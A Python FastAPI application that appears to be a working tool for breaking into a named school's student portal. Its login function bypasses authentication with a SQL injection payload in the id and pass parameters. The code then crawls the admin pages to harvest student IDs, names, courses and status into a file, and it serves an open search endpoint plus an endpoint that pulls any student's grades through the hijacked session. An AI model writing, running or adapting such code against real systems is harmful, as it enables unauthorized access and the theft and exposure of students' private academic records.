import os
import re
import requests
from bs4 import BeautifulSoup
from fastapi import FastAPI, BackgroundTasks, HTTPException, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles

app = FastAPI()

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configuration & Absolute Pathing
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_FILE = os.path.join(BASE_DIR, "organized_students.txt")
STATIC_DIR = os.path.join(BASE_DIR, "static")
SECRET_SYNC_KEY = "SHADOW_SYNC_2026"
BASE_URL = "https://ccsjdm.com/student_portal/gs"

# Ensure static directory exists
if not os.path.exists(STATIC_DIR):
    os.makedirs(STATIC_DIR)

# Mount the static folder
app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")

def get_portal_session():
    """Bypasses portal login using SQLi."""
    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    auth_url = f"{BASE_URL}/login.php?id='OR'1'='1&pass='OR'1'='1"
    try:
        s.get(auth_url, timeout=15)
        return s if s.cookies.get('PHPSESSID') else None
    except:
        return None

def sync_students_task():
    """Background task to crawl the portal."""
    session = get_portal_session()
    if not session: return
    
    master_list = []
    for char in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        try:
            resp = session.get(f"{BASE_URL}/admin-portal/view_students.php?search={char}", timeout=20)
            soup = BeautifulSoup(resp.text, 'html.parser')
            rows = soup.find_all('tr', class_='hover:bg-gray-50')
            for row in rows:
                cols = row.find_all('td')
                if len(cols) >= 4:
                    data = f"studentID:{cols[0].text.strip()},name:{cols[1].text.strip()},cys:{cols[2].text.strip()},status:{cols[3].text.strip()}"
                    master_list.append(data)
        except: continue

    if master_list:
        with open(DB_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(master_list))

# --- ROUTES ---

@app.get("/", response_class=HTMLResponse)
async def read_index():
    """Directly reads and returns the HTML to force rendering."""
    index_path = os.path.join(STATIC_DIR, "index.html")
    try:
        if os.path.exists(index_path):
            with open(index_path, "r", encoding="utf-8") as f:
                return f.read()
        return "<h1>Error: static/index.html not found</h1>"
    except Exception as e:
        return f"<h1>Server Error: {str(e)}</h1>"

@app.get("/api/status")
async def system_status():
    return {
        "status": "Shadow Engine Online",
        "db_initialized": os.path.exists(DB_FILE),
        "db_size": os.path.getsize(DB_FILE) if os.path.exists(DB_FILE) else 0
    }

@app.get("/api/sync")
async def trigger_sync(background_tasks: BackgroundTasks, key: str = None):
    if key != SECRET_SYNC_KEY:
        raise HTTPException(status_code=403, detail="Unauthorized")
    background_tasks.add_task(sync_students_task)
    return {"message": "Sync initiated."}

@app.get("/api/search")
async def search_students(q: str = Query(..., min_length=2)):
    if not os.path.exists(DB_FILE):
        return {"results": [], "error": "DB not ready"}
    query = q.upper()
    with open(DB_FILE, "r", encoding="utf-8") as f:
        matches = [line.strip() for line in f if query in line.upper()]
        return {"results": matches[:20]}

@app.get("/api/grades/{student_id}")
async def get_grades(student_id: str):
    session = get_portal_session()
    if not session: raise HTTPException(status_code=500)
    try:
        resp = session.get(f"{BASE_URL}/admin-portal/view_student_grades.php?id={student_id}", timeout=15)
        soup = BeautifulSoup(resp.text, 'html.parser')
        tables = soup.find_all('table')
        transcript = []
        for table in tables:
            if not table.find('div', class_='subject-code'): continue
            sem_info = {"term": "Academic Record", "subjects": [], "gwa": "0.00"}
            rows = table.find_all('tr', class_='hover:bg-gray-50')
            for row in rows:
                cols = row.find_all('td')
                sem_info["subjects"].append({
                    "code": row.select_one('.subject-code').text.strip(),
                    "description": row.select_one('.subject-desc').text.strip(),
                    "grade": row.select_one('.grade-badge').text.strip() if row.select_one('.grade-badge') else "-"
                })
            transcript.append(sem_info)
        return {"transcript": transcript}
    except: raise HTTPException(status_code=500)
